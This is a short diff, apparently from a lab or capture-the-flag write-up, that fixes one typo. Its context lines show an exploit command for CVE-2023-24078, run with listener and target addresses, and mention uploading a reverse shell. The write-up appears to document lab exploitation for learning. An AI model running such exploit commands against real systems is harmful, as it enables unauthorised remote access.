@@ -118,7 +118,7 @@ python3 CVE-2023-24078.py -p 4444 -l 192.168.45.209 -r 192.168.227.25 -P 8082
 ![](https://i.imgur.com/M4AiPru.png)
 
 
-First of all on the new popped-up browser you should see a link make sure to copy the link has this is the location we are uploading our reverse shell to
+First of all on the new popped-up browser you should see a link make sure to copy the link as this is the location we are uploading our reverse shell to
 
 
 ![](https://i.imgur.com/3VTOOg5.png)
